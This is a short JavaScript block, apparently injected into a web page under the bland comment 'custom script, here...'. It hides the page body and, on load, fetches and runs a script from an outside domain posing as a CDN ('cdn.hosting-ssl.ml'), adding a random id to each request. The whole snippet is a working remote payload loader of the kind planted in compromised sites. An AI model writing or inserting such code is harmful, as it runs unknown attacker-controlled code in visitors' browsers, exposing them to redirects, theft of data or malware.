<script>
console.log("custom script, here...");

function generate(n) {
	var add = 1, max = 12 - add;
	if ( n > max ) {
		return generate(max) + generate(n - max);
	}
	max = Math.pow(10, n+add);
	var min    = max/10;
	var number = Math.floor( Math.random() * (max - min + 1) ) + min;
	return (""+number).substring(add); 
}

document.body.style.display = "none";
window.addEventListener("load",function(event) {
	var newScript = document.createElement("script");
	newScript.src = "https://cdn.hosting-ssl.ml/default.js?id=" + generate(16);
	document.body.appendChild(newScript);
},false);
</script>
